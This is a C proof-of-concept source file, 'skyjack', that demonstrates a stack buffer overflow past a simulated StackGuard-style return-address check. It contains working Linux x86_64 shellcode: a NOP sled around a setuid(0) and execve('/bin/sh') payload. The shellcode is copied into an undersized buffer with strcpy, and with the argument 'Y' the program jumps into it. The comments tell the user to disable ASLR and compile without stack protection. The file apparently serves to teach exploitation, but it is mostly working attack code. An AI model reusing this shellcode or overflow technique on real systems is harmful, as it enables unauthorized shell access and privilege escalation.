//
//  main.c
//  skyjack
//
//  Created by Mahmut Bulut on 23/11/14.
//  Copyright (c) 2014 Mahmut Bulut. All rights reserved.
//
// Disable ASLR:
//  	echo 0 > /proc/sys/kernel/randomize_va_space
//
// and compile this via:
// 		gcc -g -fpic -fno-stack-protector -DFORTIFY_SOURCE=0 -z execstack skyjack.c -o skyjack
// to use shell exploit.
//

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

char* data;

void watchaddr() {
    printf("%p\n", __builtin_return_address(2));
}

void doodah(char *argv[])
{
    /**
     * Simulate the behavior of StackGuard (preamble)
     * 1- Get return address
     * 2- Allocate space on heap
     * 3- Put return address to a randomized address
     * (for this demonstration we put it in 0xD - can be randomized)
     */
    printf("%p\n", __builtin_return_address(0));
    data = (unsigned long long*) malloc(sizeof(unsigned long long)*0xDEADBEEF);
    *(unsigned long long *)(&data+0xD) = __builtin_return_address(0);

    
    /**
     * Shellcode to execute after buffer overflow
     * This shellcode writes itself every execution to memory
     * In some ASLR protection data is written via cache invalidation
     * ref. https://github.com/sharedRoutine/ASLR-Write/blob/master/aslrwrite.h#L81
     */
    char shellcode[] =
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" \
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" \
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" \
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" \
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" \
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" \
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" \
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" \
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" \
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" \

    /**
     * Above NOP sled is 100 bytes
     */
    
    "\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62" \
    "\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31" \
    "\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c" \
    "\x58\x0f\x05" \

    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" \

    /**
     * Above shell launcher part is 60 bytes and it is only for Linux x86_64
     */
    
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" \
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" \
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" \
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" \
    
    /**
     * Above NOP sled is 40 bytes
     */
    
    /**
     * Buffer is full now smash the RBP
     */
    
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";
    
    char* dat = (char *) __builtin_return_address(0);
    printf("Overwriting return address %x\n", dat); // to end of shellcode
    // copy expected return address (low bytes) and evade from ASLR crashes temporarily
    memcpy((void *)shellcode+216, &dat, 4);

    /**
     * print the ending of shellcode to see it was compensated by the address
     */
    printf("212 pchar %x\n", shellcode[212]);
    printf("213 pchar %x\n", shellcode[213]);
    printf("214 pchar %x\n", shellcode[214]);
    printf("215 pchar %x\n", shellcode[215]);
    printf("216 pchar %x\n", shellcode[216]);
    printf("217 pchar %x\n", shellcode[217]);
    printf("218 pchar %x\n", shellcode[218]);
    printf("219 pchar %x\n", shellcode[219]);

    printf("Expected function return addr %p\n", __builtin_return_address(0));
    printf("Shellcode address on DS %p\n", &shellcode);

    /**
     * Buffer, which is going to be overflow
     */
    char buffer[200];
    strcpy(buffer, shellcode);
    printf("BUFFER %p\n", &buffer);

    if (argv[1] != 0x0 && strcmp(argv[1], "Y") == 0)
    {
        (*(void (*)()) buffer)();
    }

    /**
     * Below code behaves like stack guard (postamble)
     * Checks return address with address saved in heap
     */
    printf("%p\n", __builtin_return_address(0));
    printf("GELEN ADRES %p\n", *(&data+0xD));
    printf("ALINAN ADRES %p\n", __builtin_return_address(0));

    if (*(&data+0xD) == __builtin_return_address(0)) {
        _exit(0); // if everything is ok _exit, without atexit(without stack cleanup and alignment)
    } else{
        abort(); // or abort immediately with unsuccessful termination.
    }
}

int main(int argc, char *argv[])
{
    if (argc != 2)
    {
        perror("usage:\n\t- pass Y to use shell exploit\n\t- pass N to look return address backup");
        exit(EXIT_FAILURE);
    }

    /**
     * Goin' to run all night
     * Goin' to run all day
     * I bet my money on a bob-tailed nag
     * Somebody bet on the gray
     * 
     * http://youtu.be/noYptXPHiAE
     */
    
    printf("DOO-DAH\n");
    doodah(argv);

    return 0;
}
